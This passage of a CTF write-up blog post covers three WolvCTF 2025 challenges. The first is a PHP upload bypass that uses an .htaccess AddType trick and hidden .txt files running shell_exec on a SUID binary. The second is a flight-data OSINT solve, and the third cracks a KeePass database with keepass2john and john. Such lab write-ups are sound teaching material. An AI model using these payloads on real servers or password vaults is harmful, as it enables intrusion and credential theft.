+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">400</span> /var/www/html/flag.txt<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy get_flag over and compile</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> get_flag.c /var/www/html/get_flag.c<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> gcc /var/www/html/get_flag.c -o /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown root:www-data /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">4755</span> /var/www/html/get_flag <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    rm /var/www/html/get_flag.c<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Create a cron job to delete uploads every hour, we can review them fast enough</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;0 * * * * root find /var/www/html/uploads -type f -delete&#34;</span> &gt; /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod <span class="m">0644</span> /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> crontab /etc/cron.d/delete-uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Start apache and cron</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> bash -c <span class="s2">&#34;cron &amp;&amp; apache2-foreground&#34;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="step-1" class="relative group">Step 1 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1" aria-label="Anchor">#</a></span></h4><p>In <code>index.php</code> there is the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Get the extention by getting everyting past the last &#39;.&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">last</span> <span class="p">(</span><span class="nv">$lastDotPosition</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$lastDotPosition</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Since there is a loose comparison (== instead of ===), this means if the last dot position is 0, this will evaluate to try and the extension will be empty. therefore, hidden files do not count as an extension</p>
+<h4 id="step-2" class="relative group">Step 2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2" aria-label="Anchor">#</a></span></h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Ensure that the extention is a txt file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;Sorry, only .txt extensions are allowed&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>As long as our file does not contain an extension, it can be uploaded. this includes <code>.htaccess</code> files. an <code>.htaccess</code> file can be uploaded that contains the following to allow <code>.txt</code> files to execute as php:</p>
+<pre tabindex="0"><code>AddType application/x-httpd-php .txt
+</code></pre><h4 id="step-3" class="relative group">Step 3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3" aria-label="Anchor">#</a></span></h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$old_path</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// make unreadable - the proper way
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;chmod -- 000 *&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$old_path</span><span class="p">);</span>
+</span></span></code></pre></div><p>Due to the &ndash; in the chmod command, an attacker can not upload file such as <code>--reference=file.txt</code>. However, since they changed the <code>.htaccess</code> file to execute commands as php, they can upload a hidden file that will not get hit by the <code>chmod --- 000 *</code> command. This may be hard to notice, since the <code>.htaccess</code> is forbidden by default. <code>.call_get_flag.txt</code> can be uploaded containing the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;/var/www/html/get_flag 2&gt;&amp;1&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><h4 id="step-4" class="relative group">Step 4 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4" aria-label="Anchor">#</a></span></h4><p>An attacker needs to go into their cookies on the browser and grab PHPSESSID. Then they can navigate to the following URL (example PHPSESSID:fb14797cfe048e2eab6f43d87ba82592)</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu1209673873984896265.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu16401126413375633199.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu10525272346150449667.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu3360096476535968456.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1658"
+        height="536"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu10190992705482235710.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu9616412093236145441.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu10190992705482235710.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu18296284674224090508.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173220_hu4238588253057771921.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>after uploading the .htaccess file and .backdoor.txt, an attacker can navigate to the following:</p>
+<p><a href="https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag.txt" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag.txt</a></p>
+<p>They will get this error:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu3017086136321217158.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu1612459968745924186.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu8812155516064599910.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu9148889630887377162.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2688"
+        height="540"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu15635408600658576506.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu10376727351906921042.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu15635408600658576506.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu1586685442473471092.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173941_hu12365692297020050429.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>Error opening file: No such file or directory 
+</code></pre><h4 id="step-5" class="relative group">Step 5 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5" aria-label="Anchor">#</a></span></h4><p>After reading the source file of get_flag.c, or downloading the file by navigating to
+<a href="https://art-contest-974780027560.us-east5.run.app/get_flag" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/get_flag</a> and testing it, the attacker realizes they need to execute the SUID binary in the diretory <code>/var/www/html</code> since it is reading <code>./flag.txt</code>, not <code>/var/www/html/flag.txt</code>. they can create another file and upload it named <code>.call_get_flag_in_dir.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;/var/www/html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;./get_flag&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><a href="https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag_in_dir.txt" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app/uploads/fb14797cfe048e2eab6f43d87ba82592/.call_get_flag_in_dir.txt</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu15258069501955058213.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu12311698076366335843.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu15687936628791287274.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu14566076299728284088.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2662"
+        height="450"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu4308607405150707229.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu421313097674838345.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu4308607405150707229.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu2676465164175127007.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324173903_hu842746934344147781.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<pre tabindex="0"><code>wctf{m1ss3d_m3_chm0d_:3}
+</code></pre><hr>
+<h2 id="lost-2" class="relative group">Lost 2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#lost-2" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu7876552114256522574.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu16528386425757849990.webp 660w
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu9072050260477786045.webp 980w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu9072050260477786045.webp 980w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="980"
+        height="1132"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu16853167183703093376.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu5972616285761923956.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324174907_hu16853167183703093376.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324174907.png 980w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324174907.png 980w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-1" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-1" aria-label="Anchor">#</a></span></h3><p>My other friend Johnny is somehow&hellip;worse. All I know is he is in the US, nothing else. He messaged me in January of this year saying &ldquo;My flight took off just over a day and 2 hours late due to weather this SUCKS I could have driven there and back soooo many times by now&rdquo; and &ldquo;Sorry meant to send that last month lol airplane mode :PPP&rdquo;</p>
+<p>There&rsquo;s no shot of finding him right? If you do pls send the flight number using the IATA code not ICAO thanks (Flag format: wctf{XX####})</p>
+<h3 id="solve-1" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-1" aria-label="Anchor">#</a></span></h3><p>Check the government website for databases to get the full set of data (since you can&rsquo;t just input one airport): <a href="https://www.transtats.bts.gov/DataIndex.asp" target="_blank" rel="noreferrer">https://www.transtats.bts.gov/DataIndex.asp</a></p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/1_hu7166457620377279922.webp 330w,/posts/wolvctf-2025-individual/1_hu9717098045931019777.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/1_hu1935761773060414038.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/1_hu15443632547999237593.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3315"
+        height="2070"
+        class="mx-auto my-0 rounded-md"
+        alt="databases"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/1_hu3948971553457889381.png"
+          srcset="/posts/wolvctf-2025-individual/1_hu981707382427761100.png 330w,/posts/wolvctf-2025-individual/1_hu3948971553457889381.png 660w
+          
+            ,/posts/wolvctf-2025-individual/1_hu3384236152085351343.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/1_hu7014225029576353811.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/2_hu5819364551176521198.webp 330w,/posts/wolvctf-2025-individual/2_hu12670179032863784084.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/2_hu10280179414513037622.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/2_hu1597116012794832866.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3355"
+        height="2090"
+        class="mx-auto my-0 rounded-md"
+        alt="tables"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/2_hu4570681035230944364.png"
+          srcset="/posts/wolvctf-2025-individual/2_hu16538559435187034283.png 330w,/posts/wolvctf-2025-individual/2_hu4570681035230944364.png 660w
+          
+            ,/posts/wolvctf-2025-individual/2_hu10232481076393976588.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/2_hu14351791456643851554.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Eventually make your way to the <code>Marketing Carrier On-Time Performance</code> and filter by December 2024: <a href="https://www.transtats.bts.gov/DL_SelectFields.aspx?gnoyr_VQ=FGK&amp;QO_fu146_anzr=b0-gvzr" target="_blank" rel="noreferrer">https://www.transtats.bts.gov/DL_SelectFields.aspx?gnoyr_VQ=FGK&QO_fu146_anzr=b0-gvzr</a></p>
+<p>This will show specific details about US based flights, such as departure delays</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/3_hu6166914208801582607.webp 330w,/posts/wolvctf-2025-individual/3_hu6664617674343172241.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/3_hu1265294936333615373.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/3_hu9916987419349388228.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3205"
+        height="2082"
+        class="mx-auto my-0 rounded-md"
+        alt="transportation stats"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/3_hu7695617458872730362.png"
+          srcset="/posts/wolvctf-2025-individual/3_hu260825033250730146.png 330w,/posts/wolvctf-2025-individual/3_hu7695617458872730362.png 660w
+          
+            ,/posts/wolvctf-2025-individual/3_hu6371956464956297248.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/3_hu16050999343974438224.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Need to select the following:</p>
+<pre tabindex="0"><code>IATA_Code_Marketing_Airline	
+Flight_Number_Marketing_Airline
+
+OriginCityName
+DestCityName
+
+DepDelay 
+WeatherDelay
+</code></pre><p>The first two are to get the flight number for the flag, the city names are so we can confirm they are close to each other (from the message saying he could have driven back and forth several times), the departure delay to confirm it&rsquo;s around 26 hours late, and weather delay to confirm the delay is due to weather.</p>
+<p>Open in excel or other editor and sort <code>WeatherDelay</code>:
+
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/4_hu12468475150226037408.webp 330w,/posts/wolvctf-2025-individual/4_hu526982005486729968.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/4_hu8459462698616094328.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/4_hu8018548955756119230.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3812"
+        height="1697"
+        class="mx-auto my-0 rounded-md"
+        alt="excel"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/4_hu13450802845974994435.png"
+          srcset="/posts/wolvctf-2025-individual/4_hu1472186559683671776.png 330w,/posts/wolvctf-2025-individual/4_hu13450802845974994435.png 660w
+          
+            ,/posts/wolvctf-2025-individual/4_hu8977579349516614762.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/4_hu11179609897170790036.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Confirmation using flight radar that on December 24, the flight was delayed ~26 hours:</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/5_hu12583080651560742740.webp 330w,/posts/wolvctf-2025-individual/5_hu8383762061805501937.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/5_hu7450080175948381122.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/5_hu4149948983850790909.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="3382"
+        height="2112"
+        class="mx-auto my-0 rounded-md"
+        alt="confirmation"
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/5_hu12810819837654908693.png"
+          srcset="/posts/wolvctf-2025-individual/5_hu17503641420395854136.png 330w,/posts/wolvctf-2025-individual/5_hu12810819837654908693.png 660w
+          
+            ,/posts/wolvctf-2025-individual/5_hu7673534834426516104.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/5_hu12011652115655236962.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="passwords" class="relative group">Passwords <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#passwords" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu3884220363242683904.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu8237021955428881648.webp 660w
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu5055933092094985527.webp 968w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu5055933092094985527.webp 968w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="968"
+        height="802"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu9117577717227151444.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu16846775284962152569.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324180345_hu9117577717227151444.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324180345.png 968w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324180345.png 968w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description-2" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description-2" aria-label="Anchor">#</a></span></h3><h3 id="solve-2" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve-2" aria-label="Anchor">#</a></span></h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx &gt; keepass.hash
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx               
+</span></span></span><span class="line"><span class="cl"><span class="go">Database:$keepass$*2*6000*0*5bd85bff1c654df5d8cb8f64b877ea179b66978615917c39faf6edd98444928b*dec1f1a8a46d2257b1c536800ccea618d15523c983162f1a760d0f0e3f32bed6*02dc62f9e295c9a256e4e231b3102c1a*8ed6478291ac58151a98e7465f10a11e8cafc1706d048ef4f94fe51453f091bc*193dd9a5673c4a3f5b33dd59639f27760f03285044f14eacc652f4a441b45413
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ keepass2john Database.kdbx &gt; keepass.hash                    
+</span></span></span><span class="line"><span class="cl"><span class="go">                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">┌──(kali㉿kali)-[~/ctf/Passwords]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+</span></span></span><span class="line"><span class="cl"><span class="go">Using default input encoding: UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="go">Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 1 (iteration count) is 6000 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 2 (version) is 2 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+</span></span></span><span class="line"><span class="cl"><span class="go">Will run 4 OpenMP threads
+</span></span></span><span class="line"><span class="cl"><span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span></span><span class="line"><span class="cl"><span class="go">0g 0:00:00:47 0.35% (ETA: 02:50:40) 0g/s 1297p/s 1297c/s 1297C/s 159753159753..141106
+</span></span></span><span class="line"><span class="cl"><span class="go">goblue1          (Database)     
+</span></span></span><span class="line"><span class="cl"><span class="go">1g 0:00:01:10 DONE (2025-03-09 23:09) 0.01424g/s 1269p/s 1269c/s 1269C/s gobucks1..giana
+</span></span></span><span class="line"><span class="cl"><span class="go">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span></span><span class="line"><span class="cl"><span class="go">Session completed. 
+</span></span></span></code></pre></div><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu351519795778028908.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu8674492713245719603.webp 660w
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu14188921707202275143.webp 864w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324180843_hu14188921707202275143.webp 864w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="864"
+        height="772"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
